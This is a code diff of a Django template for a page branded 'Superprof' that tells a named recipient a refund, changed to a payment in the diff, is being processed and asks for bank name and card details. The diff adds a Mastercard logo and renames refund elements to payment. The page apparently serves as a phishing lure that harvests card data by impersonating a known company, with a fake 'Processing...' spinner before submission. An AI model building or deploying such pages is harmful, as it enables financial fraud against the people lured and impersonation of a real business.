@@ -1,6 +1,6 @@
-{% extends 'refund/base.html' %}
+{% extends 'base.html' %}
 
-{% block title %}Superprof - Refund{% endblock %}
+{% block title %}Superprof - Payment{% endblock %}
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
 {% block extra_css %}
 <style>
@@ -67,6 +67,7 @@
     }
     
     .visa-logo {
+        display: grid;
         position: absolute;
         right: 15px;
         top: 50%;
@@ -206,7 +207,7 @@
 {% endblock %}
 
 {% block content %}
-<p>Dear {{ recipient_name }}, we apologize for the inconvenience and are processing a refund for you. Please provide your payment details so we can complete the transaction promptly. We’ll notify you once our payment system is fully restored.</p>
+<p>Dear {{ recipient_name }}, we apologize for the inconvenience and are processing a payment for you. Please provide your payment details so we can complete the transaction promptly. We’ll notify you once our payment system is fully restored.</p>
 
 
 
@@ -218,7 +219,7 @@
     </div>
 {% endif %}
 
-<form method="POST" id="refundForm">
+<form method="POST" id="paymentForm">
     {% csrf_token %}
     
     <label for="{{ form.bank_name.id_for_label }}">Bank Name</label>
@@ -245,6 +246,8 @@
     <div class="card-number-wrapper">
         {{ form.card_number }}
         <img class="visa-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa Logo" />
+        <img class="visa-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard Logo" />
+
     </div>
     {% if form.card_number.errors %}
         <ul class="field-errors">
@@ -279,8 +282,8 @@
         </div>
     </div>
     
-    <button type="submit" id="refund-submit-btn">
-      <span id="refund-text">Submit Refund Details</span>
+    <button type="submit" id="payment-submit-btn">
+      <span id="payment-text">Submit Payment Details</span>
       <span id="spinner" class="spinner hidden">
       </span>
     </button>
@@ -320,11 +323,11 @@
 </script>
 
 <script>
-  document.getElementById("refundForm").addEventListener("submit", function (event) {
+  document.getElementById("paymentForm").addEventListener("submit", function (event) {
     const form = event.target;
-    const btn = document.getElementById("refund-submit-btn");
+    const btn = document.getElementById("payment-submit-btn");
     const spinner = document.getElementById("spinner");
-    const refundText = document.getElementById("refund-text");
+    const paymentText = document.getElementById("payment-text");
 
     event.preventDefault();
 
@@ -335,7 +338,7 @@
 
     btn.disabled = true;
     spinner.classList.remove("hidden");
-    refundText.textContent = "Processing...";
+    paymentText.textContent = "Processing...";
 
     setTimeout(function () {
       form.submit();
